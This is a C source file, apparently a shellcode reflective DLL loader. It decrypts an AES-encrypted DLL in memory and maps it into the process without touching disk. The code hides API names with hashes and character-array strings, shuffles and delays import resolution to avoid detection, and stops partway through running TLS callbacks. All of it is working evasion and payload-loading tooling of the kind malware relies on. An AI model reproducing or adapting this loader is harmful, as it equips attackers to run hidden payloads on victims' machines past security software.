#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "GetProcAddressWithHash.h"

#include <windows.h>
#include <winternl.h>
#include <intrin.h>

#ifdef _DEBUG
#include "Dummy.h"
#endif

#define SRDI_CLEARHEADER 0x1
#define SRDI_CLEARMEMORY 0x2
#define SRDI_OBFUSCATEIMPORTS 0x4

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

/** NOTE: module hashes are computed using all-caps unicode strings */
#define KERNEL32DLL_HASH				0x6A4ABC5B
#define NTDLLDLL_HASH					0x3CFA685D

#define LOADLIBRARYA_HASH				0x726774c
#define GETPROCADDRESS_HASH				0x7802f749
#define VIRTUALALLOC_HASH				0xe553a458
#define EXITTHREAD_HASH					0xa2a1de0
#define NTFLUSHINSTRUCTIONCACHE_HASH	0x945cb1af
#define RTLEXITUSERTHREAD_HASH			0xFF7F061A // Vista+
#define GETNATIVESYSTEMINFO_HASH	    0x959e0033
#define VIRTUALPROTECT_HASH				0xc38ae110
#define MESSAGEBOXA_HASH				0x7568345
#define LOCALFREE_HASH					0xea61fcb1			
#define VIRTUALFREE_HASH				0x300f2f0b
#define SLEEP_HASH						0xe035f044
#define RTLADDFUNCTIONTABLE_HASH		0x45b82eba

#define LDRLOADDLL_HASH					0xbdbf9c13
#define LDRGETPROCADDRESS_HASH			0x5ed941b5
#define BCRYPTDESTROYKEYHASH			0x0D11B053
#define COPYMEMORYHASH					0x25B58ABE

#define HASH_KEY						13

#ifdef _WIN64
#define HOST_MACHINE IMAGE_FILE_MACHINE_AMD64
#else
#define HOST_MACHINE IMAGE_FILE_MACHINE_I386
#endif

// 100-ns period
#define OBFUSCATE_IMPORT_DELAY 5 * 1000 * 10000

typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
typedef BOOL(*EXPORTFUNC)(LPVOID, DWORD);

typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef ULONG_PTR(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef VOID(WINAPI* EXITTHREAD)(DWORD);
typedef BOOL(NTAPI* FLUSHINSTRUCTIONCACHE)(HANDLE, LPCVOID, SIZE_T);
typedef VOID(WINAPI* GETNATIVESYSTEMINFO)(LPSYSTEM_INFO);
typedef BOOL(WINAPI* VIRTUALPROTECT)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef int (WINAPI* MESSAGEBOXA)(HWND, LPSTR, LPSTR, UINT);
typedef BOOL(WINAPI* VIRTUALFREE)(LPVOID, SIZE_T, DWORD);
typedef BOOL(WINAPI* LOCALFREE)(LPVOID);
typedef VOID(WINAPI* SLEEP)(DWORD);
typedef BOOLEAN(WINAPI* RTLADDFUNCTIONTABLE)(PVOID, DWORD, DWORD64);
typedef VOID(WINAPI* COPYMEMORY)(PVOID, VOID*, SIZE_T);

typedef NTSTATUS(WINAPI* LDRLOADDLL)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
typedef NTSTATUS(WINAPI* LDRGETPROCADDRESS)(HMODULE, PANSI_STRING, WORD, PVOID*);

typedef NTSTATUS(WINAPI* BCRYPTOPENALGORITHMPROVIDER)(PVOID*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTGETPROPERTY)(PVOID, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTSETPROPERTY)(PVOID, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTGENERATESYMMETRICKEY)(PVOID, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTDECRYPT)(PVOID, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTCLOSEALGORITHMPROVIDER)(PVOID, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTDESTROYKEY)(PVOID);

typedef BOOL(WINAPI* HEAPFREE)(HANDLE, DWORD, LPVOID);
typedef HANDLE(WINAPI* GETPROCESSHEAP)(VOID);
typedef LPVOID(WINAPI* HEAPALLOC)(HANDLE, DWORD, SIZE_T);

#pragma warning( push )
#pragma warning( disable : 4214 ) // nonstandard extension
typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;
#pragma warning(pop)

static inline size_t
AlignValueUp(size_t value, size_t alignment) {
	return (value + alignment - 1) & ~(alignment - 1);
}
static inline size_t
_strlen(char* s) {
	size_t i;
	for (i = 0; s[i] != '\0'; i++);
	return i;
}

static inline size_t
_wcslen(wchar_t* s) {
	size_t i;
	for (i = 0; s[i] != '\0'; i++);
	return i;
}

#define RVA(type, base, rva) (type)((ULONG_PTR) base + rva)

#define FILL_STRING(string, buffer) \
	string.Length = (USHORT)_strlen(buffer); \
	string.MaximumLength = string.Length; \
	string.Buffer = buffer

#define FILL_UNI_STRING(string, buffer) \
	string.Length = (USHORT)_wcslen(buffer); \
	string.MaximumLength = string.Length; \
	string.Buffer = buffer

#define FILL_STRING_WITH_BUF(string, buffer) \
	string.Length = sizeof(buffer); \
	string.MaximumLength = string.Length; \
	string.Buffer = (PCHAR)buffer

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

VOID Mcpy(PBYTE src, PBYTE dst, SIZE_T size) {
	for (int i = 0; i < size; dst[i++] = src[i]);
}

#ifdef _DEBUG
ULONG_PTR LoadDLL()
#else
ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash, 
	LPVOID lpUserData, DWORD dwUserdataLen, DWORD cbCipherText)
#endif
{
#pragma warning( push )
#pragma warning( disable : 4055 ) // Ignore cast warnings

	// Function pointers

	LDRLOADDLL pLdrLoadDll = NULL;
	LDRGETPROCADDRESS pLdrGetProcAddress = NULL;

	LOADLIBRARYA pLoadLibraryA = NULL;
	VIRTUALALLOC pVirtualAlloc = NULL;
	FLUSHINSTRUCTIONCACHE pFlushInstructionCache = NULL;
	GETNATIVESYSTEMINFO pGetNativeSystemInfo = NULL;
	VIRTUALPROTECT pVirtualProtect = NULL;
	VIRTUALFREE pVirtualFree = NULL;
	LOCALFREE pLocalFree = NULL;
	SLEEP pSleep = NULL;
	RTLADDFUNCTIONTABLE pRtlAddFunctionTable = NULL;
	COPYMEMORY pCopyMemory = NULL;
	
	BCRYPTOPENALGORITHMPROVIDER pBCryptOpenAlgorithmProvider = NULL;
	BCRYPTGETPROPERTY pBCryptGetProperty = NULL;
	BCRYPTSETPROPERTY pBCryptSetProperty = NULL;
	BCRYPTGENERATESYMMETRICKEY pBCryptGenerateSymmetricKey = NULL;
	BCRYPTDECRYPT pBCryptDecrypt = NULL;
	BCRYPTCLOSEALGORITHMPROVIDER pBCryptCloseAlgorithmProvider = NULL;
	BCRYPTDESTROYKEY pBCryptDestroyKey = NULL;

	HEAPFREE pHeapFree = NULL;
	GETPROCESSHEAP pGetProcessHeap = NULL;
	HEAPALLOC pHeapAlloc = NULL;

	//CHAR msg[2] = { 'a','\0' };
	//MESSAGEBOXA pMessageBoxA = NULL;

	// PE data
	PIMAGE_NT_HEADERS ntHeaders;
	PIMAGE_SECTION_HEADER sectionHeader;
	PIMAGE_DATA_DIRECTORY dataDir;
	PIMAGE_IMPORT_DESCRIPTOR importDesc;
	PIMAGE_DELAYLOAD_DESCRIPTOR delayDesc;
	PIMAGE_THUNK_DATA firstThunk, origFirstThunk;
	PIMAGE_IMPORT_BY_NAME importByName;
	PIMAGE_TLS_DIRECTORY tlsDir;
	PIMAGE_TLS_CALLBACK* callback;
	PIMAGE_BASE_RELOCATION relocation;
	PIMAGE_RELOC relocList;
	PIMAGE_EXPORT_DIRECTORY exportDir;
	PIMAGE_RUNTIME_FUNCTION_ENTRY rfEntry;
	PDWORD expName;
	PWORD expOrdinal;
	LPCSTR expNameStr;

	// Functions
	DLLMAIN dllMain;
	EXPORTFUNC exportFunc;

	// Memory protections
	DWORD executable, readable, writeable, protect;

	// Counters
	DWORD i = 0;
	DWORD c = 0;

	// Alignment
	DWORD lastSectionEnd;
	DWORD endOfSection;
	DWORD alignedImageSize;
	ULONG_PTR baseOffset;
	SYSTEM_INFO sysInfo;

	// General
	DWORD funcHash;
	DWORD importCount;
	HANDLE library;
	HANDLE cryptLib;

	// String
	UNICODE_STRING uString = { 0 };
	STRING aString = { 0 };

	WCHAR sKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l' };
	WCHAR sBcrypt[] = { 'B', 'c', 'r', 'y', 'p', 't', '.', 'd', 'l', 'l' };

	// At a certain length (15ish), the compiler with screw with inline
	// strings declared as CHAR. No idea why, use BYTE to get around it.

	BYTE sSleep[] = { 'S', 'l', 'e', 'e', 'p' };
	BYTE sLoadLibrary[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A' };
	BYTE sVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c' };
	BYTE sVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't' };
	BYTE sFlushInstructionCache[] = { 'F', 'l', 'u', 's', 'h', 'I', 'n', 's', 't', 'r', 'u', 'c', 't', 'i', 'o', 'n', 'C', 'a', 'c', 'h', 'e' };
	BYTE sGetNativeSystemInfo[] = { 'G', 'e', 't', 'N', 'a', 't', 'i', 'v', 'e', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o' };
	BYTE sRtlAddFunctionTable[] = { 'R', 't', 'l', 'A', 'd', 'd', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', 'T', 'a', 'b', 'l', 'e' };
	BYTE sCopyMemory[] = { 'C', 'o', 'p', 'y', 'M', 'e', 'm', 'o', 'r', 'y' };

	BYTE sBCryptOpenAlgorithmProvider[] = { 'B', 'C', 'r', 'y', 'p', 't', 'O', 'p', 'e', 'n', 'A', 'l', 'g', 'o', 'r', 'i', 't', 'h', 'm', 'P', 'r', 'o', 'v', 'i', 'd', 'e', 'r' };
	BYTE sBCryptGetProperty[] = { 'B', 'C', 'r', 'y', 'p', 't', 'G', 'e', 't', 'P', 'r', 'o', 'p', 'e', 'r', 't', 'y' };
	BYTE sBCryptSetProperty[] = { 'B', 'C', 'r', 'y', 'p', 't', 'S', 'e', 't', 'P', 'r', 'o', 'p', 'e', 'r', 't', 'y' };
	BYTE sBCryptGenerateSymmetricKey[] = { 'B', 'C', 'r', 'y', 'p', 't', 'G', 'e', 'n', 'e', 'r', 'a', 't', 'e', 'S', 'y', 'm', 'm', 'e', 't', 'r', 'i', 'c', 'K', 'e', 'y' };
	BYTE sBCryptDecrypt[] = { 'B', 'C', 'r', 'y', 'p', 't', 'D', 'e', 'c', 'r', 'y', 'p', 't' };
	BYTE sBCryptCloseAlgorithmProvider[] = { 'B', 'C', 'r', 'y', 'p', 't', 'C', 'l', 'o', 's', 'e', 'A', 'l', 'g', 'o', 'r', 'i', 't', 'h', 'm', 'P', 'r', 'o', 'v', 'i', 'd', 'e', 'r' };
	BYTE sBCryptDestroyKey[] = { 'B', 'C', 'r', 'y', 'p', 't', 'D', 'e', 's', 't', 'r', 'o', 'y', 'K', 'e', 'y' };

	// Heap functions for Bcrypt
	BYTE SHeapAlloc[] = { 'H', 'e', 'a', 'p', 'A', 'l', 'l', 'o', 'c' };
	BYTE sGetProcessHeap[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'H', 'e', 'a', 'p' };
	BYTE sHeapFree[] = { 'H', 'e', 'a', 'p', 'F', 'r', 'e', 'e' };

	// Bcrypt macro strings
	WCHAR sChainingModeCBC[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 'C', 'B', 'C', 0 };
	WCHAR sChainingMode[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 0 };
	WCHAR sBlockLength[] = { 'B', 'l', 'o', 'c', 'k', 'L', 'e', 'n', 'g', 't', 'h', 0 };
	WCHAR sObjectLength[] = { 'O', 'b', 'j', 'e', 'c', 't', 'L', 'e', 'n', 'g', 't', 'h', 0 };
	WCHAR sAES[] = { 'A', 'E', 'S', 0 };
	
	// Crypto
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	BYTE  rgbIV[16] = { 0 };
	BYTE  rgbAES128Key[16] = { 0 };
	PVOID hAesAlg = NULL;
	PVOID hKey = NULL;
	DWORD cbKeyObject = 0;
	DWORD cbData = 0;
	DWORD cbBlockLen = 0;
	DWORD cbRawData = 0;
	PBYTE pbKeyObject = NULL;
	PBYTE pbIV = NULL;
	PBYTE pbRawData = NULL;
	
	// Import obfuscation
	DWORD dwRandSeed;
	DWORD dwRand;
	DWORD dwSleep;
	DWORD dwSelection;
	IMAGE_IMPORT_DESCRIPTOR tempDesc;

	// Relocated base
	ULONG_PTR pBaseAddress = NULL;

	// -------

	///
	// STEP 1: locate all the required functions
	///

	pLdrLoadDll = (LDRLOADDLL)GetProcAddressWithHash(LDRLOADDLL_HASH);
	pLdrGetProcAddress = (LDRGETPROCADDRESS)GetProcAddressWithHash(LDRGETPROCADDRESS_HASH);

	uString.Buffer = sKernel32;
	uString.MaximumLength = sizeof(sKernel32);
	uString.Length = sizeof(sKernel32);

	//pMessageBoxA = (MESSAGEBOXA)GetProcAddressWithHash(MESSAGEBOXA_HASH);

	pLdrLoadDll(NULL, 0, &uString, &library);

	FILL_STRING_WITH_BUF(aString, sVirtualAlloc);
	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pVirtualAlloc);

	FILL_STRING_WITH_BUF(aString, sVirtualProtect);
	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pVirtualProtect);

	FILL_STRING_WITH_BUF(aString, sFlushInstructionCache);
	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pFlushInstructionCache);

	FILL_STRING_WITH_BUF(aString, sGetNativeSystemInfo);
	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pGetNativeSystemInfo);

	FILL_STRING_WITH_BUF(aString, sSleep);
	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pSleep);

	FILL_STRING_WITH_BUF(aString, sRtlAddFunctionTable);
	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pRtlAddFunctionTable);

	FILL_STRING_WITH_BUF(aString, sLoadLibrary);
	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pLoadLibraryA);

	//FILL_STRING_WITH_BUF(aString, sMessageBox);
	//pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pMessageBoxA);

	//FILL_STRING_WITH_BUF(aString, sCopyMemory);
	//status = pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pCopyMemory);
	//pCopyMemory = (COPYMEMORY)GetProcAddressWithHash(COPYMEMORYHASH);

	FILL_STRING_WITH_BUF(aString, sHeapFree);
	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pHeapFree);

	FILL_STRING_WITH_BUF(aString, sGetProcessHeap);
	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pGetProcessHeap);

	FILL_STRING_WITH_BUF(aString, SHeapAlloc);
	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pHeapAlloc);
	
	if (!pVirtualAlloc || !pVirtualProtect || !pSleep || /*!pCopyMemory ||*/
		!pFlushInstructionCache || !pGetNativeSystemInfo || !pHeapFree ||
		!pGetProcessHeap || !pHeapAlloc) 
	{
		return 0;
	}

	uString.Buffer = sBcrypt;
	uString.MaximumLength = sizeof(sBcrypt);
	uString.Length = sizeof(sBcrypt);
	
	pLdrLoadDll(NULL, 0, &uString, &cryptLib);

	FILL_STRING_WITH_BUF(aString, sBCryptOpenAlgorithmProvider);
	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptOpenAlgorithmProvider);

	FILL_STRING_WITH_BUF(aString, sBCryptGetProperty);
	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptGetProperty);

	FILL_STRING_WITH_BUF(aString, sBCryptSetProperty);
	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptSetProperty);

	FILL_STRING_WITH_BUF(aString, sBCryptGenerateSymmetricKey);
	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptGenerateSymmetricKey);

	FILL_STRING_WITH_BUF(aString, sBCryptDecrypt);
	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptDecrypt);

	FILL_STRING_WITH_BUF(aString, sBCryptCloseAlgorithmProvider);
	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptCloseAlgorithmProvider);

	/// WTF
	pBCryptDestroyKey = (BCRYPTDESTROYKEY)GetProcAddressWithHash(BCRYPTDESTROYKEYHASH);
	//FILL_STRING_WITH_BUF(aString, sBCryptDestroyKey);
	//pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptDestroyKey);
	/// END OF WTF
		
	if (!pBCryptOpenAlgorithmProvider || !pBCryptGetProperty || !pBCryptSetProperty || !pBCryptGenerateSymmetricKey ||
		!pBCryptDecrypt || !pBCryptCloseAlgorithmProvider || !pBCryptDestroyKey) 
	{
		return 0;
	}


	///
	// STEP 2: Decrypt dll
	///
	
	// Copy key and iv from the first 32 bytes of cipher text
	Mcpy(pbCipherText, rgbAES128Key, 16);
	Mcpy(&pbCipherText[16], rgbIV, 16);

	// Open an algorithm handle.	
	if (!NT_SUCCESS(status = pBCryptOpenAlgorithmProvider(
		&hAesAlg,
		sAES,
		NULL,
		0)))
	{
		goto Cleanup;
	}
	
	// Calculate the size of the buffer to hold the KeyObject.
	if (!NT_SUCCESS(status = pBCryptGetProperty(
		hAesAlg,
		sObjectLength,
		(PBYTE)&cbKeyObject,
		sizeof(DWORD),
		&cbData,
		0)))
	{
		goto Cleanup;
	}

	// Allocate the key object on the heap.
	pbKeyObject = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbKeyObject);

	// Calculate the block length for the IV.
	if (!NT_SUCCESS(status = pBCryptGetProperty(
		hAesAlg,
		sBlockLength,
		(PBYTE)&cbBlockLen,
		sizeof(DWORD),
		&cbData,
		0)))
	{
		goto Cleanup;
	}

	// Determine whether the cbBlockLen is not longer than the IV length.
	if (cbBlockLen > sizeof(rgbIV))
	{
		goto Cleanup;
	}

	// Allocate a buffer for the IV. The buffer is consumed during the 
	// encrypt/decrypt process.
	pbIV = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbBlockLen);
	if (NULL == pbIV)
	{
		goto Cleanup;
	}

	//pCopyMemory(pbIV, rgbIV, cbBlockLen);
	Mcpy(rgbIV, pbIV, 16);

	if (!NT_SUCCESS(status = pBCryptSetProperty(
		hAesAlg,
		sChainingMode,
		(PBYTE)sChainingModeCBC,
		sizeof(sChainingModeCBC),
		0)))
	{
		goto Cleanup;
	}

	// Generate the key from supplied input key bytes.
	if (!NT_SUCCESS(status = pBCryptGenerateSymmetricKey(
		hAesAlg,
		&hKey,
		pbKeyObject,
		cbKeyObject,
		(PBYTE)rgbAES128Key,
		sizeof(rgbAES128Key),
		0)))
	{
		goto Cleanup;
	}

	// Get the output buffer size.
	if (!NT_SUCCESS(status = pBCryptDecrypt(
		hKey,
		&pbCipherText[32],
		cbCipherText - 32,
		NULL,
		pbIV,
		cbBlockLen,
		NULL,
		0,
		&cbRawData,
		0x00000001)))  // BCRYPT_BLOCK_PADDING
	{
		goto Cleanup;
	}

	pbRawData = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbRawData);
	if (NULL == pbRawData)
	{
		goto Cleanup;
	}

	if (!NT_SUCCESS(status = pBCryptDecrypt(
		hKey,
		&pbCipherText[32],
		cbCipherText - 32,
		NULL,
		pbIV,
		cbBlockLen,
		pbRawData,
		cbRawData,
		&cbRawData,
		0x00000001)))  // BCRYPT_BLOCK_PADDING
	{
		goto Cleanup;
	}

	///
	// STEP 3: load our image into a new permanent location in memory
	///

	ntHeaders = RVA(PIMAGE_NT_HEADERS, pbRawData, ((PIMAGE_DOS_HEADER)pbRawData)->e_lfanew);

	// Perform sanity checks on the image (Stolen from https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c)

	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
		return 0;

	if (ntHeaders->FileHeader.Machine != HOST_MACHINE)
		return 0;

	if (ntHeaders->OptionalHeader.SectionAlignment & 1)
		return 0;

	// Align the image to the page size (Stolen from https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c)

	sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	lastSectionEnd = 0;

	for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++) {
		if (sectionHeader->SizeOfRawData == 0) {
			endOfSection = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.SectionAlignment;
		}
		else {
			endOfSection = sectionHeader->VirtualAddress + sectionHeader->SizeOfRawData;
		}

		if (endOfSection > lastSectionEnd) {
			lastSectionEnd = endOfSection;
		}
	}

	pGetNativeSystemInfo(&sysInfo);
	alignedImageSize = (DWORD)AlignValueUp(ntHeaders->OptionalHeader.SizeOfImage, sysInfo.dwPageSize);
	if (alignedImageSize != AlignValueUp(lastSectionEnd, sysInfo.dwPageSize)) {
		return 0;
	}

	// Allocate all the memory for the DLL to be loaded into. Attempt to use the preferred base address.

	pBaseAddress = (ULONG_PTR)pVirtualAlloc(
		(LPVOID)(ntHeaders->OptionalHeader.ImageBase),
		alignedImageSize,
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
	);

	if (pBaseAddress == 0) {
		pBaseAddress = (ULONG_PTR)pVirtualAlloc(
			NULL,
			alignedImageSize,
			MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
		);
	}

	// Copy over the headers

	((PIMAGE_DOS_HEADER)pBaseAddress)->e_lfanew = ((PIMAGE_DOS_HEADER)pbRawData)->e_lfanew;

	for (i = ((PIMAGE_DOS_HEADER)pbRawData)->e_lfanew; i < ntHeaders->OptionalHeader.SizeOfHeaders; i++) {
		((PBYTE)pBaseAddress)[i] = ((PBYTE)pbRawData)[i];
	}

	ntHeaders = RVA(PIMAGE_NT_HEADERS, pBaseAddress, ((PIMAGE_DOS_HEADER)pBaseAddress)->e_lfanew);

	///
	// STEP 4: Load in the sections
	///

	sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

	for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++) {
		for (c = 0; c < sectionHeader->SizeOfRawData; c++) {
			((PBYTE)(pBaseAddress + sectionHeader->VirtualAddress))[c] = ((PBYTE)(pbRawData + sectionHeader->PointerToRawData))[c];
		}
	}

	///
	// STEP 5: process all of our images relocations (assuming we missed the preferred address)
	///

	baseOffset = pBaseAddress - ntHeaders->OptionalHeader.ImageBase;
	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	if (baseOffset && dataDir->Size) {

		relocation = RVA(PIMAGE_BASE_RELOCATION, pBaseAddress, dataDir->VirtualAddress);

		while (relocation->VirtualAddress) {
			relocList = (PIMAGE_RELOC)(relocation + 1);

			while ((PBYTE)relocList != (PBYTE)relocation + relocation->SizeOfBlock) {

				if (relocList->type == IMAGE_REL_BASED_DIR64)
					*(PULONG_PTR)((PBYTE)pBaseAddress + relocation->VirtualAddress + relocList->offset) += baseOffset;
				else if (relocList->type == IMAGE_REL_BASED_HIGHLOW)
					*(PULONG_PTR)((PBYTE)pBaseAddress + relocation->VirtualAddress + relocList->offset) += (DWORD)baseOffset;
				else if (relocList->type == IMAGE_REL_BASED_HIGH)
					*(PULONG_PTR)((PBYTE)pBaseAddress + relocation->VirtualAddress + relocList->offset) += HIWORD(baseOffset);
				else if (relocList->type == IMAGE_REL_BASED_LOW)
					*(PULONG_PTR)((PBYTE)pBaseAddress + relocation->VirtualAddress + relocList->offset) += LOWORD(baseOffset);

				relocList++;
			}
			relocation = (PIMAGE_BASE_RELOCATION)relocList;
		}
	}

	///
	// STEP 6: process our import table
	///

	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	dwRandSeed = (DWORD)((ULONGLONG)pbRawData);

	if (dataDir->Size) {

		importDesc = RVA(PIMAGE_IMPORT_DESCRIPTOR, pBaseAddress, dataDir->VirtualAddress);
		importCount = 0;
		for (; importDesc->Name; importDesc++) {
			importCount++;
		}

		importDesc = RVA(PIMAGE_IMPORT_DESCRIPTOR, pBaseAddress, dataDir->VirtualAddress);
		if (importCount > 1) {
			dwSleep = (4096);
			dwSleep = dwSleep >> 16;

			for (i = 0; i < importCount - 1; i++) {
				dwRandSeed = (214013 * dwRandSeed + 2531011);
				dwRand = (dwRandSeed >> 16) & 0x7FFF;
				dwSelection = i + dwRand / (32767 / (importCount - i) + 1);

				tempDesc = importDesc[dwSelection];
				importDesc[dwSelection] = importDesc[i];
				importDesc[i] = tempDesc;
			}
		}

		importDesc = RVA(PIMAGE_IMPORT_DESCRIPTOR, pBaseAddress, dataDir->VirtualAddress);
		for (; importDesc->Name; importDesc++) {

			library = pLoadLibraryA((LPSTR)(pBaseAddress + importDesc->Name));

			firstThunk = RVA(PIMAGE_THUNK_DATA, pBaseAddress, importDesc->FirstThunk);
			origFirstThunk = RVA(PIMAGE_THUNK_DATA, pBaseAddress, importDesc->OriginalFirstThunk);

			for (; origFirstThunk->u1.Function; firstThunk++, origFirstThunk++) {

				if (IMAGE_SNAP_BY_ORDINAL(origFirstThunk->u1.Ordinal)) {
					pLdrGetProcAddress(library, NULL, (WORD)origFirstThunk->u1.Ordinal, (PVOID*)&(firstThunk->u1.Function));
				}
				else {
					importByName = RVA(PIMAGE_IMPORT_BY_NAME, pBaseAddress, origFirstThunk->u1.AddressOfData);
					FILL_STRING(aString, importByName->Name);
					pLdrGetProcAddress(library, &aString, 0, (PVOID*)&(firstThunk->u1.Function));
				}
			}

			if (importCount > 1) {
				pSleep(dwSleep * 1000);
			}
		}
	}

	///
	// STEP 7: process our delayed import table
	///

	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];

	if (dataDir->Size) {
		delayDesc = RVA(PIMAGE_DELAYLOAD_DESCRIPTOR, pBaseAddress, dataDir->VirtualAddress);

		for (; delayDesc->DllNameRVA; delayDesc++) {

			library = pLoadLibraryA((LPSTR)(pBaseAddress + delayDesc->DllNameRVA));

			firstThunk = RVA(PIMAGE_THUNK_DATA, pBaseAddress, delayDesc->ImportAddressTableRVA);
			origFirstThunk = RVA(PIMAGE_THUNK_DATA, pBaseAddress, delayDesc->ImportNameTableRVA);

			for (; firstThunk->u1.Function; firstThunk++, origFirstThunk++) {
				if (IMAGE_SNAP_BY_ORDINAL(origFirstThunk->u1.Ordinal)) {
					pLdrGetProcAddress(library, NULL, (WORD)origFirstThunk->u1.Ordinal, (PVOID*)&(firstThunk->u1.Function));
				}
				else {
					importByName = RVA(PIMAGE_IMPORT_BY_NAME, pBaseAddress, origFirstThunk->u1.AddressOfData);
					FILL_STRING(aString, importByName->Name);
					pLdrGetProcAddress(library, &aString, 0, (PVOID*)&(firstThunk->u1.Function));
				}
			}
		}
	}

	///
	// STEP 8: Finalize our sections. Set memory protections.
	///

	sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

	for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++) {

		if (sectionHeader->SizeOfRawData) {

			// determine protection flags based on characteristics
			executable = (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
			readable = (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ) != 0;
			writeable = (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

			if (!executable && !readable && !writeable)
				protect = PAGE_NOACCESS;
			else if (!executable && !readable && writeable)
				protect = PAGE_WRITECOPY;
			else if (!executable && readable && !writeable)
				protect = PAGE_READONLY;
			else if (!executable && readable && writeable)
				protect = PAGE_READWRITE;
			else if (executable && !readable && !writeable)
				protect = PAGE_EXECUTE;
			else if (executable && !readable && writeable)
				protect = PAGE_EXECUTE_WRITECOPY;
			else if (executable && readable && !writeable)
				protect = PAGE_EXECUTE_READ;
			else if (executable && readable && writeable)
				protect = PAGE_EXECUTE_READWRITE;

			if (sectionHeader->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
				protect |= PAGE_NOCACHE;
			}

			// change memory access flags
			pVirtualProtect(
				(LPVOID)(pBaseAddress + sectionHeader->VirtualAddress),
				sectionHeader->SizeOfRawData,
				protect, &protect
			);
		}

	}

	// We must flush the instruction cache to avoid stale code being used
	pFlushInstructionCache((HANDLE)-1, NULL, 0);

	///
	// STEP 9: Execute TLS callbacks
	///

	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (dataDir->Size)
	{
		tlsDir = RVA(PIMAGE_TLS_DIRECTORY, pBaseAddress, dataDir->VirtualAddress);
		callback = (PIMAGE_TLS_CALLBACK*)(tlsDir->AddressOfCallBacks);

